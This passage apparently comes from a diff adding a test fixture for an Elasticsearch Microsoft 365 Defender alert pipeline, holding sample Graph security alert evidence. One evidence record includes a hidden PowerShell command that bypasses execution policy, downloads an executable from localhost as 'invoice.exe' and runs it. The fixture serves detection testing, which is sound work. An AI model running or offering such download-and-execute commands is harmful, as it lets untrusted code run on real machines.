\/1.exe\"},{\"@odata.type\":\"#microsoft.graph.security.ipEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"suspicious\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"ipAddress\":\"\",\"countryLetterCode\":null},{\"@odata.type\":\"#microsoft.graph.security.processEvidence\",\"createdDateTime\":\"2052-10-20T09:53:10.1933333Z\",\"verdict\":\"unknown\",\"remediationStatus\":\"none\",\"remediationStatusDetails\":null,\"roles\":[],\"detailedRoles\":[],\"tags\":[],\"processId\":8224,\"parentProcessId\":5772,\"processCommandLine\":\"powershell.exe  -NoExit -ExecutionPolicy Bypass -WindowStyle Hidden $ErrorActionPreference= 'silentlycontinue';(New-Object System.Net.WebClient).DownloadFile('http:\\/\\/127.0.0.1\\/1.exe', 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe');Start-Process 'C:\\\\\\\\test-WDATP-test\\\\\\\\invoice.exe'\",\"processCreationDateTime\":\"2052-10-20T09:51:39.4997961Z\",\"parentProcessCreationDateTime\":\"2052-10-20T09:51:19.5064237Z\",\"detectionStatus\":\"detected\",\"mdeDeviceId\":\"735f41e26eba5899c9cbe8b0bb8e74e32de2a509\",\"imageFile\":{\"sha1\":\"f64f11028554687a33ba8252c6cdb0e43c31c686\",\"sha256\":\"f676eb0806ddc77ddbe9e5ee3141a7767337b7a789c6a8883505ba83ebdb8c17\",\"fileName\":\"powershell.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\\\\WindowsPowerShell\\\\v1.0\",\"fileSize\":491520,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"parentProcessImageFile\":{\"sha1\":null,\"sha256\":null,\"fileName\":\"cmd.exe\",\"filePath\":\"C:\\\\Windows\\\\System32\",\"fileSize\":323584,\"filePublisher\":\"Microsoft Corporation\",\"signer\":null,\"issuer\":null},\"userAccount\":{\"accountName\":\"ACVSqdkLV-14709\",\"domainName\":\"AzureAD\",\"userSid\":\"S-1-12-1-1485667349-1150190949-4065799612-2328216759\",\"azureAdUserId\":null,\"userPrincipalName\":null,\"displayName\":null}}]}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    },
+    {
+      "message": "{\"@odata.context\":\"https://graph.microsoft.com/v1.0/$metadata#security/alerts_v2\",\"value\":[]}",
+      "tags": [
+        "preserve_original_event",
+        "preserve_duplicate_custom_fields"
+      ]
+    }
+  ],
+  "meta": {
+    "data_stream": "alert",
+    "dynamic_fields": {},
+    "elasticsearch_version": "9.2.2",
+    "entry_pipeline": "compat-m365_defender-alert-default",
+    "event_count": 5,
+    "numeric_keyword_fields": [],
+    "package": "m365_defender",
+    "pipelines_commit": "2c934eb5223bdfcf0ea0db9e3230154933352bda"
+  }
+}
